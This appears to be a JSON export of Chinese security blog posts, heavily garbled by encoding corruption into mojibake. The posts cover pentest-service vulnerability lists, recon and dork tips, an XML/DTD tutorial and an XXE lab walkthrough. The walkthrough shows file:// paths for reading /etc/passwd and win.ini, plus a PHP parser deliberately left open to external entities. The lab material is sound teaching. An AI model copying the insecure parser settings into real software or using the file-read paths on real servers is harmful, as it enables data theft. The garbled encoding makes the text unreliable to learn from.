å®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡Urldecodeæ³¨å…¥ã€å¦‚æœå­˜åœ¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯¹æ³¨å…¥ç‚¹è¿›è¡Œæ³¨å…¥æ”»å‡»ï¼Œæ³¨å…¥æ”»å‡»æ˜¯å¯¹æ•°æ®åº“ç›´æ¥æ“ä½œï¼Œå¯è½»æ˜“è·å¾—ç½‘ç«™çš„åå°ç®¡ç†æƒé™ï¼Œç”šè‡³ç½‘ç«™æœåŠ¡å™¨çš„ç®¡ç†æƒé™ã€‚å¹¶å¯èƒ½å¯¼è‡´ç”¨æˆ·èµ„æ–™æ³„éœ²ã€‚é‡è¦çš„æ•æ„Ÿä¿¡æ¯æ³„æ¼ï¼ŒSQL æ³¨å…¥å¯è·å–å¤§é‡ä¼ä¸šæ ¸å¿ƒä¸šåŠ¡æ•°æ®ç­‰æ¥å£é—®é¢˜å¼•èµ·çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ ä¸¥é‡çš„é€»è¾‘è®¾è®¡æ¼æ´: åŒ…æ‹¬æ‰¹é‡ä¿®æ”¹ä»»æ„è´¦å·å¯†ç æ¼æ´ã€æç°å¯†ç ä»»æ„ä¿®æ”¹ï¼Œæ’¤å•æ¼æ´ï¼Œè®¢å•ç¯¡æ”¹æ¼æ´ï¼Œæ‰¾å›å¯†ç æ¼æ´ï¼Œä»»æ„æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯æ¼æ´ï¼ˆå§“åï¼Œæ‰‹æœºå·ï¼Œé‚®ç®±ï¼Œèº«ä»½è¯ï¼‰ï¼Œé“¶è¡Œå¡å·ä¿¡æ¯ä»»æ„æ›´æ”¹ï¼Œä»»æ„æ¬¡æ•°çŸ­ä¿¡å‘é€ã€ä»»æ„æ‰‹æœºå·ç æˆ–é‚®ç®±æ³¨å†Œæ¼æ´ï¼Œè´¦å·æ™®é€šè¶Šæƒæ“ä½œä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç ï¼Œç»•è¿‡é™åˆ¶ä¿®æ”¹ç”¨æˆ·èµ„æ–™ã€æ‰§è¡Œç”¨æˆ·æ“ä½œç­‰ï¼Œåå°æˆ–è€…apiæ¥å£å®‰å…¨è®¤è¯ç»•è¿‡æ¼æ´æ¶‰åŠä¼ä¸šæ ¸å¿ƒä¸šåŠ¡çš„é€»è¾‘æ¼æ´ã€‚ ç›´æ¥è·å–ç³»ç»Ÿæƒé™çš„æ¼æ´: ï¼ˆæœåŠ¡å™¨æƒé™ã€å®¢æˆ·ç«¯æƒé™ï¼‰åŒ…æ‹¬è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€ä»»æ„ä»£ç æ‰§è¡Œã€ä¸Šä¼ è·å–Webshellã€SQLæ³¨å…¥è·å–ç³»ç»Ÿæƒé™ã€ç¼“å†²åŒºæº¢å‡ºï¼ˆåŒ…æ‹¬å¯åˆ©ç”¨çš„ActiveXç¼“å†²åŒºæº¢å‡ºï¼‰æ•æ„Ÿä¿¡æ¯è¶Šæƒè®¿é—®ï¼ŒåŒ…æ‹¬ä½†ä¸ä»…é™äºç»•è¿‡è®¤è¯ç›´æ¥è®¿é—®ç®¡ç†åå°ã€é‡è¦åå°å¼±å¯†ç ã€è·å–å¤§é‡å†…ç½‘æ•æ„Ÿä¿¡æ¯çš„SSRFç­‰ã€‚ æ–‡ä»¶ä¸Šä¼ æ“ä½œæ¼æ´: æ£€æµ‹ç½‘ç«™çš„ä¸Šä¼ åŠŸèƒ½æ˜¯å¦å­˜åœ¨ä¸Šä¼ æ¼æ´ï¼ŒåŒ…å«move_uploaded_file()ä¸Šä¼ å‡½æ•°æµ‹è¯•æœ‰æ²¡æœ‰å®‰å…¨è¿‡æ»¤ï¼Œæ–‡ä»¶å¤´ã€content_typeéªŒè¯ç»•è¿‡ï¼Œç»•è¿‡ä¸Šä¼ æ–‡ä»¶æ ¼å¼ï¼ˆasp,php,jsp.ç­‰è„šæœ¬æ–‡ä»¶ï¼‰ï¼Œç»•è¿‡ä¸Šä¼ çš„ç›®å½•ï¼Œæ–‡ä»¶æ“ä½œæ¼æ´ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶åŒ…å«æˆªæ–­ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ–‡ä»¶ä»»æ„åˆ é™¤æ¼æ´ï¼‰å¦‚æœå­˜åœ¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ä¸Šä¼ æœ¨é©¬ä»è€Œåœ¨ç½‘ç«™ä¸Šè·å–Webshellå¹¶è¿›è€Œæ§åˆ¶ç½‘ç«™ï¼Œä¹Ÿå¯ä»¥ç ´åç½‘ç«™ï¼Œå±å®³è¾ƒä¸¥é‡ã€‚ã€‚ XSSè·¨ç«™æ¼æ´ï¼š æ£€æµ‹ç½‘ç«™æ˜¯å¦å­˜åœ¨åå°„æ€§XSSï¼Œå­˜å‚¨æ€§XSSæ¼æ´ï¼ŒXXSæ¼æ´ç»å¸¸å‡ºç°åœ¨æ–‡ç« å‘è¡¨ï¼Œè¯„è®ºå›å¤ï¼Œç•™è¨€ï¼Œä¸ªäººèµ„æ–™è®¾ç½®ï¼Œå‘é€ä¿¡ä»¶ï¼Œæ³¨å†Œèµ„æ–™ç­‰ç­‰ç¨‹åºåŠŸèƒ½ä¸Šï¼Œå¸¸ç”¨çš„è¾“å…¥å‡½æ•°åˆ—è¡¨ï¼šprintã€print_rã€echoã€printfã€sprintfã€dieã€var-dumpã€var_exportï¼Œç­‰å‡½æ•°åˆ—è¡¨é‡Œè¿›è¡Œæ¼æ´æµ‹è¯•ï¼ŒXSSè·¨ç«™æ”»å‡»ï¼Œä¼šçªƒå–ç”¨æˆ·cookiesã€åˆ©ç”¨CSRFæ¼æ´è¿›è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ŒåŠ«æŒç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜çš„èº«ä»½è¿›è¡Œç½‘ç«™ææƒï¼Œä¸Šä¼ æœ¨é©¬åé—¨ï¼Œæ·»åŠ ç®¡ç†å‘˜è´¦å·ï¼Œä¿®æ”¹ç½‘ç«™é…ç½®ã€‚ æºä»£ç æ³„éœ²: æ£€æµ‹ç½‘ç«™æ˜¯å¦å­˜åœ¨æºä»£ç æ³„éœ²æ¼æ´ï¼Œå¦‚æœå­˜åœ¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯ç›´æ¥ä¸‹è½½ç½‘ç«™çš„æºä»£ç ã€‚å¹¶è·å–ç½‘ç«™çš„æ•°æ®åº“å¯†ç ä»¥åŠç®¡ç†å¯†ç ã€‚æ£€æµ‹ç½‘ç«™çš„æŸäº›éšè—ç›®å½•æ˜¯å¦å­˜åœ¨æ³„éœ²æ¼æ´ã€‚å¦‚æœå­˜åœ¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯äº†è§£ç½‘ç«™çš„å…¨éƒ¨ç»“æ„ã€‚æ™®é€šä¿¡æ¯æ³„æ¼ã€‚åŒ…æ‹¬å®¢æˆ·ç«¯æ˜æ–‡å­˜å‚¨å¯†ç ã€ä»¥åŠwebè·¯å¾„éå†ã€ç³»ç»Ÿè·¯å¾„éå†ç­‰ã€‚ æ™®é€šçš„æµ‹è¯•æœåŠ¡å’Œæ¼æ´æ‰«æå·¥å…·åªèƒ½å‘ç°å¸¸è§„æ€§çš„æ¼æ´ï¼Œè€Œå¯¹äºç³»ç»Ÿæ·±å±‚æ¬¡çš„æ¼æ´å’Œä¸šåŠ¡é€»è¾‘æ¼æ´ä¸€èˆ¬æ‰«æå™¨æ˜¯æ— æ³•æ¢æµ‹åˆ°çš„ï¼Œå› æ­¤éœ€è¦é€‰æ‹©äººå·¥å®‰å…¨æ¸—é€æµ‹è¯•æœåŠ¡æ¥å¯¹ä¸šåŠ¡ç³»ç»Ÿåšæ›´æ·±å±‚æ¬¡ã€æ›´å…¨é¢çš„å®‰å…¨æ£€æŸ¥ã€‚ å®‰å…¨è¯„ä¼°æŠ¥å‘ŠÂ· æ ¹æ®ä¸åŒçš„æ¸—é€æµ‹è¯•ç»“æœï¼Œå½¢æˆä¸€å¥—å®Œæ•´çš„å®‰å…¨æŠ¥å‘Šã€‚æŠ¥å‘Šå‡ºæ‰€å‘ç°çš„æœ€æ–°æ¼æ´ä»¥åŠä¿®å¤æ–¹æ¡ˆã€‚Â· æ ¹æ®å‘ç°çš„æ¼æ´ï¼Œåˆ†ä¸‰ä¸ªé£é™©çº§åˆ«ï¼Œé«˜å±ï¼Œä¸­ç­‰ï¼Œä½å±ä¸‰ä¸ªç­‰çº§ã€‚Â· æˆ‘ä»¬ä¸åšé»‘å®¢æ”»å‡»ï¼Œåœ¨æ´½è°ˆåˆä½œæ—¶,éœ€è¦æä¾›ç½‘ç«™å’ŒæœåŠ¡å™¨çš„æ‰€æœ‰æƒè¯æ˜ã€‚ +++ æ¸—é€æµ‹è¯•çš„æœ¬è´¨å°±æ˜¯ä¿¡æ¯æ”¶é›†ï¼ˆä¾¯äº®Micro8ï¼‰ æ¼æ´åº“ï¼šexoloit.db inurl:t.me ç¤¾å·¥åº“ ï¼ˆtelegramä¸å®‰å…¨ï¼‰ IISï¼ˆ Windowsæ¦‚å¿µï¼‰ WSL Docker wappalyzer webrobotç›®å½•æ‰«æ ***çš„éšè—å¯†ç å¯ä»¥æ”¹å˜æ£€æŸ¥ä¸­type=â€œpasswordâ€ä¸ºtype=â€ä»»æ„å­—ç¬¦â€œæ¥è·å–å¯†ç  ## googleï¼š é€šé…ç¬¦* é€»è¾‘é- 2333 -ä¹ è¿‘å¹³ å»é™¤ç™¾åº¦å³è¾¹å¹¿å‘Š site:baidu.comæ‰«èµ„äº§ intitle:åå°ç™»å½• inurl:url å…³é”®å­— shodanæœç´¢å¼•æ“ æ‰¾åŒæ¨¡æ¿çš„ç½‘ç«™ï¼Œçœ‹logoï¼Œé—´æ¥æ¸—é€ï¼› ç½‘ç«™icuææµé‡ï¼› ssrä»£ç†ï¼› è¯ä¹¦åæŸ¥ï¼› é‚®ä»¶æŸ¥çœ‹IPï¼Œç‚¹å‡»æ˜¾ç¤ºé‚®ä»¶åŸæ–‡ï¼›","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"XML & DTD","slug":"2020-03-1-XML&DTD","date":"2020-03-01T02:00:08.000Z","updated":"2020-04-25T16:32:48.164Z","comments":true,"path":"2020/03/01/2020-03-1-XML&DTD/","link":"","permalink":"https://singlemindedt.github.io/2020/03/01/2020-03-1-XML&DTD/","excerpt":"","text":"XMLç®€ä»‹ XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚ XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚(HTMLè¢«è®¾è®¡ç”¨äºæ˜¾ç¤ºæ•°æ®) XMLæ²¡æœ‰é¢„å®šä¹‰çš„æ ‡ç­¾ï¼Œéœ€è‡ªè¡Œå®šä¹‰ã€‚ XML è¢«è®¾è®¡ä¸ºå…·æœ‰è‡ªæˆ‘æè¿°æ€§ XMLç»“æ„XMLæ–‡æ¡£åŒ…å«ï¼š XMLå£°æ˜ DTDæ–‡æ¡£ç±»å‹å®šä¹‰(å¯é€‰) æ–‡æ¡£å…ƒç´  XMLæ–‡æ¡£å¯çœ‹ä½œæ˜¯ä¸€ç§æ ‘ç»“æ„ï¼Œç”±æ ‘æ ¹â€”&gt;æ ‘å¶ï¼› 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!-- å®šä¹‰ XML çš„ç‰ˆæœ¬ï¼ˆ1.0ï¼‰å’Œæ‰€ä½¿ç”¨çš„ç¼–ç ï¼ˆUTF-8 : ä¸‡å›½ç , å¯æ˜¾ç¤ºå„ç§è¯­è¨€ï¼‰ --&gt;&lt;note&gt;&lt;to&gt;Alice&lt;/to&gt;&lt;from&gt;Bob&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;I miss you !&lt;/body&gt;&lt;/note&gt; XMLå…ƒç´ XML å…ƒç´ æŒ‡çš„æ˜¯ä»ï¼ˆä¸”åŒ…æ‹¬ï¼‰å¼€å§‹æ ‡ç­¾ç›´åˆ°ï¼ˆä¸”åŒ…æ‹¬ï¼‰ç»“æŸæ ‡ç­¾çš„éƒ¨åˆ†ã€‚ä¸€ä¸ªå…ƒç´ å¯ä»¥åŒ…å«ï¼šå…¶ä»–å…ƒç´ ã€æ–‡æœ¬ã€å±æ€§ã€æˆ–æ··åˆå‰å‡ ç§å…ƒç´ æ³¨æ„ï¼š å…ƒç´ æ ‡è®°åŒºåˆ†å¤§å°å†™ &lt;Name&gt; â‰ &lt;name&gt;; XMLå…ƒç´ æ ‡è®°å‘½åè§„åˆ™: å¯ä»¥åŒ…å«å­—æ¯ï¼Œæ•°å­—åŠå…¶å®ƒå­—ç¬¦,ä¸èƒ½ä»¥æ•°å­—ã€ä¸‹åˆ’çº¿ç­‰æ ‡ç‚¹ç¬¦å·å¼€å¤´; ä¸èƒ½åŒ…å«ç©ºæ ¼ ä¸èƒ½ä»¥å­—æ¯ xmlï¼ˆæˆ–è€… XMLã€Xml ç­‰ç­‰ï¼‰å¼€å§‹ xmlæœ‰ä¸”åªæœ‰ä¸€ä¸ªæ ¹å…ƒç´ ï¼Œæ ¹å…ƒç´ çš„èµ·å§‹æ ‡è®°è¦æ”¾åœ¨æ‰€æœ‰å…¶å®ƒå…ƒç´ èµ·å§‹æ ‡è®°ä¹‹å‰ï¼Œæ ¹å…ƒç´ çš„ç»“æŸæ ‡è®°æ ¹æ”¾åœ¨å…¶å®ƒæ‰€æœ‰å…ƒç´ çš„ç»“æŸæ ‡è®°ä¹‹åã€‚ XMLè¯­æ³•XMLå±æ€§å±æ€§å€¼å¿…é¡»åŠ å¼•å· XMLæ³¨é‡Šä¸HTMLä¸€è‡´ï¼š&lt;!--This is comment --&gt; å®ä½“å¼•ç”¨å­—ç¬¦å®ä½“ç”±äºXMLä¸­éƒ¨åˆ†ç¬¦å·å…·æœ‰ç‰¹æ®Šæ„ä¹‰ï¼Œä¸ºé¿å…è§£æå™¨è§£æé”™è¯¯ï¼Œä»¥å®ä½“å¼•ç”¨ä»£æ›¿éƒ¨åˆ†å­—ç¬¦ï¼› åœ¨ XML ä¸­ï¼Œæœ‰ 5 ä¸ªé¢„å®šä¹‰çš„å®ä½“å¼•ç”¨ï¼š &amp;lt; &lt; &amp;gt; &gt; &amp;amp; &amp; &amp;apos; â€˜ &amp;quot; â€œ â€” å‘½åå®ä½“ 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root[ &lt;!ELEMENT A \"i\"&gt;&lt;!ELEMENT B \"am\"&gt;&lt;!ELEMENT C \"hacker\"&gt;]&gt;&lt;root&gt; &lt;A&gt;&amp;A;&lt;/A&gt; &lt;B&gt;&amp;B;&lt;/B&gt; &lt;C&gt;&amp;C;&lt;/C&gt;&lt;/root&gt; å‚æ•°å®ä½“combine.dtd 1&lt;!ENTITY content &quot;%parameterA;%parameterB;%parameterC;&quot;&gt; xml 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root[ &lt;!ELEMENT % parameterA \"i\"&gt;&lt;!ELEMENT % parameterB \"am\"&gt;&lt;!ELEMENT % parameterC \"hacker\"&gt;&lt;!ENTITY dtd SYSTEM \"combine.dtd\"&gt;%dtd;]&gt;&lt;root&gt;&lt;foo&gt;&amp;content&lt;/foo&gt;&lt;/root&gt; å¼•ç”¨æ ¼å¼ï¼š å‚æ•°å®ä½“ %parameter_name å…¶ä»–å®ä½“ &amp;name å¤–éƒ¨å®ä½“12345&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root[ &lt;!ENTITY outfile SYSTEM \"outfile.xml\"&gt;]&gt;&lt;root&gt;&lt;outfile&gt;&amp;outfile&lt;/outfile&gt;&lt;/root&gt; XXEæ¼æ´ä¸€èˆ¬å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰å¤„ç†å¥½å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼› +++ DTD DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚ DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚ 1.å†…éƒ¨çš„DOCTYPEå£°æ˜ &lt;!DOCTYPE root-element [element-declarations]&gt;å³&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;ä¾‹ï¼š 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE note[ &lt;!--å®šä¹‰æ­¤æ–‡æ¡£ä¸ºnoteç±»å‹--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteæœ‰å››ä¸ªå…ƒç´ --&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--å®šä¹‰å…ƒç´ çš„ç±»å‹ä¸º#PCDATA--&gt;]&gt;&lt;note&gt;&lt;to&gt;Alice&lt;/to&gt;&lt;from&gt;Bob&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;I miss you !&lt;/body&gt;&lt;/note&gt; 2.å¤–éƒ¨æ–‡æ¡£å£°æ˜ &lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;å³&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt; æˆ–&lt;!DOCTYPE root-element PUBLIC &quot;public_ID&quot; &quot;filename&quot;&gt; å³&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;æ–‡ä»¶æº&quot; &quot;æ–‡ä»¶å&quot;&gt; å£°æ˜å…ƒç´ åœ¨ DTD ä¸­ï¼ŒXML å…ƒç´ é€šè¿‡å…ƒç´ å£°æ˜æ¥è¿›è¡Œå£°æ˜ã€‚å…ƒç´ å£°æ˜ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•ï¼š&lt;!ELEMENT element-name category&gt; æˆ– XXEåŸç†XXEå³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ç®€å•è§£é‡Šå¯çœ‹æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š æ³¨å…¥XMLæ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«æ¶æ„ä¿®æ”¹ï¼Œå¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œäº†ä¿®æ”¹åçš„æ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç›®çš„ï¼› å¤–éƒ¨å®ä½“ä¸ºè¾¾åˆ°æ³¨å…¥ï¼ˆä¿®æ”¹ï¼‰XMLæ•°æ®çš„ç›®çš„ï¼Œæ”»å‡»è€…é€šè¿‡å¤–éƒ¨å®ä½“å£°æ˜å£°æ˜éƒ¨åˆ†å¯¹XMLæ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œå®Œæˆæ¶æ„æ³¨å…¥ï¼› ** XXEæ¼æ´æ˜¯ç”±xmlè§£æå™¨é…ç½®ä¸å®‰å…¨ï¼Œè§£æå™¨æœ¬èº«å¹¶ä¸åˆ†æå®ä½“æ˜¯å¦ä¸ºæ¶æ„å†…å®¹ï¼Œä»…æ£€æŸ¥xmlæ–‡ä»¶æ˜¯å¦æœ‰ç»“æ„ä¸Šçš„é”™è¯¯ã€‚å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚** å…³äºï¼š[XXE-PHP Audit Basic](https://singlemindedt.github.io/2020/02/29/XXE-PHP Audit Basic/) ++++","categories":[],"tags":[{"name":"XML","slug":"XML","permalink":"https://singlemindedt.github.io/tags/XML/"},{"name":"DTD","slug":"DTD","permalink":"https://singlemindedt.github.io/tags/DTD/"}]},{"title":"XXE-PHP Audit Basic","slug":"XXE-PHP Audit Basic","date":"2020-02-29T10:20:08.000Z","updated":"2020-03-02T13:25:17.798Z","comments":true,"path":"2020/02/29/XXE-PHP Audit Basic/","link":"","permalink":"https://singlemindedt.github.io/2020/02/29/XXE-PHP Audit Basic/","excerpt":"","text":"æ­å»ºXXE-PHP Audit Basic ç¯å¢ƒXXE-PHP Audit Basic1. GitHubé¡¹ç›®é¡µVulnspyæä¾›äº†åœ¨çº¿è¿è¡Œç¯å¢ƒï¼Œå•å‡»Vsplate GO&gt;æŒ‰é’®å¯ä»¥åˆ›å»ºåœ¨çº¿ç¯å¢ƒï¼Œç›´æ¥åœ¨ä¸Šé¢æ“ä½œå³å¯ï¼› +++2. å°†XXE-PHP Audit Basicæ–‡ä»¶ä¸‹è½½ä¸‹æ¥è§£å‹è‡³Phpstudy2018\\PHPTutorial\\WWWç›®å½•ä¸‹ï¼› å¼€å¯Phpstudy2018çš„Apacheå’ŒMySqlæœåŠ¡; è®¿é—®http://127.0.0.1/phpaudit-XXE-master/ å³å¯ï¼› XXEæ¼æ´(XML External Entity,XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»)ï¼šå¦‚æœå¯ä»¥ä¸Šä¼ XMLæ–‡æ¡£æˆ–è€…åœ¨XMLæ–‡æ¡£ä¸­æ·»åŠ æ¶æ„å†…å®¹ï¼Œé€šè¿‡æ˜“å—æ”»å‡»çš„ä»£ç ã€ä¾èµ–é¡¹ï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿæ”»å‡»å«æœ‰ç¼ºé™·çš„XMLå¤„ç†å™¨ã€‚ å…³äºXML,ç›¸å…³é¢˜ç›® :smile:","categories":[],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://singlemindedt.github.io/tags/XXE/"}]},{"title":"XXE-PHP Audit Basicè¯¦è§£","slug":"2020-02-29-XXE-PHP Audit Basicè¯¦è§£","date":"2020-02-29T10:20:08.000Z","updated":"2020-05-15T00:25:39.566Z","comments":true,"path":"2020/02/29/2020-02-29-XXE-PHP Audit Basicè¯¦è§£/","link":"","permalink":"https://singlemindedt.github.io/2020/02/29/2020-02-29-XXE-PHP Audit Basicè¯¦è§£/","excerpt":"","text":"[TOC][5]:() 1.DOMDocument.phpç‚¹å¼€é“¾æ¥ï¼Œæœ‰å¦‚ä¸‹xmlä»£ç ï¼š ç®€å•çš„å®šä¹‰äº†ä¸€ä¸ªå¤–éƒ¨å®ä½“contentï¼Œé€šè¿‡fileåè®®æ¥è¯»å–æœåŠ¡å™¨ç«¯æœ¬æœºçš„æ–‡ä»¶ï¼ˆæ­¤å¤„è¯»å–çš„æ–‡ä»¶ä¸ºetc/passwdï¼‰ï¼› PHPä¸­å¯ä»¥é€šè¿‡FILEåè®®ã€HTTPåè®®å’ŒFTPåè®®è¯»å–æ–‡ä»¶ï¼›xmlæ–‡ä»¶ä½¿ç”¨PHPè§£æï¼Œæ•…è¿˜å¯åˆ©ç”¨PHPä¼ªåè®®; åœ¨ä½¿ç”¨file://åè®®æ—¶ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ ¼å¼ï¼š 123456789101112fileï¼š//host/path* Linux file:///etc/passwd* Unix file://localhost/etc/fstab file:///localhost/etc/fstab* Windows file:///c:/windows/win.ini file://localhost/c:/windows/win.ini* ï¼ˆä¸‹é¢è¿™ä¸¤ç§åœ¨æŸäº›æµè§ˆå™¨é‡Œæ˜¯æ”¯æŒçš„ï¼‰ file:///c|windows/win.ini file://localhost/c|windows/win.ini XMLåœ¨å„è¯­è¨€ä¸‹æ”¯æŒçš„åè®®æœ‰: æŸ¥çœ‹æºæ–‡ä»¶ï¼š 1234567891011121314151617181920&lt;?phpif(isset($_GET['s']))&#123; show_source(__FILE__); exit;&#125;libxml_disable_entity_loader(false);$data = isset($_POST['data'])?trim($_POST['data']):'';$resp = '';if($data != false)&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($data, LIBXML_NOENT); ob_start(); var_dump($dom); $resp = ob_get_contents(); ob_end_clean(); &#125;?&gt; &lt;?php echo htmlspecialchars($resp);?&gt; isset($_POST[&#39;data&#39;])æ£€æŸ¥$_POST[&#39;data&#39;]æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨è¿”å›trueï¼Œä¸å­˜åœ¨è¿”å›falseï¼› $_POST[&#39;data&#39;]è·å¾—POSTä¼ å€¼ï¼› +++ æºç è§£é‡Š:+++ libxml_disable_entity_loader(false);#ç¦ç”¨åŠ è½½å¤–éƒ¨å®ä½“çš„åŠŸèƒ½ å‚æ•°ï¼š ç¦ç”¨ï¼ˆTRUEï¼‰æˆ–å¯ç”¨ï¼ˆFALSEï¼‰libxmlæ‰©å±•ï¼ˆä¾‹å¦‚ DOM,XMLWriterå’ŒXMLReaderï¼‰ä»¥åŠ è½½å¤–éƒ¨å®ä½“ã€‚+++ $data = isset($_POST[&#39;data&#39;])?trim($_POST[&#39;data&#39;]):&#39;&#39;; #isset($_POST[&#39;data&#39;])è‹¥å­˜åœ¨ï¼ˆä¸ä¸ºç©ºï¼‰ï¼Œåˆ™è¿”å›å»é™¤ç©ºæ ¼åçš„$_POST[&#39;data&#39;]ï¼›å¦åˆ™è¿”å›ç©ºå€¼ã€‚å¹¶å°†ç»“æœèµ‹å€¼ç»™$dataè¯­æ³• 1bool isset ( mixed $var [, mixed $... ] ) æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œå¹¶ä¸”ä¸æ˜¯ NULLã€‚å¦‚æœå·²ç»ä½¿ç”¨ unset() é‡Šæ”¾äº†ä¸€ä¸ªå˜é‡ä¹‹åï¼Œå®ƒå°†ä¸å†æ˜¯ isset()ã€‚è‹¥ä½¿ç”¨ isset() æµ‹è¯•ä¸€ä¸ªè¢«è®¾ç½®æˆ NULL çš„å˜é‡ï¼Œå°†è¿”å› FALSEã€‚åŒæ—¶è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ª NULL å­—èŠ‚ï¼ˆâ€\\0â€ï¼‰å¹¶ä¸ç­‰åŒäº PHP çš„ NULL å¸¸æ•°ã€‚| å‚æ•° | æè¿° || :â€”- | :â€”â€”â€”â€”- || var | è¦æ£€æŸ¥çš„å˜é‡ã€‚ |ç»†èŠ‚ï¼šè¿”å›å€¼ï¼šå¦‚æœ var å­˜åœ¨å¹¶ä¸”å€¼ä¸æ˜¯ NULL åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ +++ $dom = new DOMDocument(); #å®ä¾‹åŒ–ä¸€ä¸ªDomDocumentå¯¹è±¡ï¼› +++ loadXML() æ–¹æ³•é€šè¿‡è§£æä¸€ä¸ª XML æ ‡ç­¾å­—ç¬¦ä¸²æ¥ç»„æˆè¯¥æ–‡æ¡£ã€‚ è¯­æ³•ï¼š 1loadXML(text) å‚æ•° æè¿° text è¦è§£æçš„ XML æ ‡ç­¾ã€‚ +++ 5. LIBXML_NOENT: å°† XML ä¸­çš„å®ä½“å¼•ç”¨ æ›¿æ¢ æˆå¯¹åº”çš„å€¼ LIBXML_DTDLOAD: åŠ è½½ DOCTYPE ä¸­çš„ DTD æ–‡ä»¶ +++ ob_startï¼šæ‰“å¼€è¾“å‡ºç¼“å†²åŒºå‡½æ•°æ ¼å¼ï¼švoid ob_start(void)è¯´æ˜ï¼šå½“ç¼“å†²åŒºæ¿€æ´»æ—¶ï¼Œæ‰€æœ‰æ¥è‡ªPHPç¨‹åºçš„éæ–‡ä»¶å¤´ä¿¡æ¯å‡ä¸ä¼šå‘é€ï¼Œè€Œæ˜¯ä¿å­˜åœ¨å†…éƒ¨ç¼“å†²åŒºã€‚ä¸ºäº†è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ob_end_flush()æˆ–flush()è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ã€‚ ob_get_contents ï¼šè¿”å›å†…éƒ¨ç¼“å†²åŒºçš„å†…å®¹ã€‚ä½¿ç”¨æ–¹æ³•ï¼šstring ob_get_contents(void)è¯´æ˜ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›å½“å‰ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå¦‚æœè¾“å‡ºç¼“å†²åŒºæ²¡æœ‰æ¿€æ´»ï¼Œåˆ™è¿”å› FALSE ã€‚ ob_end_cleanï¼šåˆ 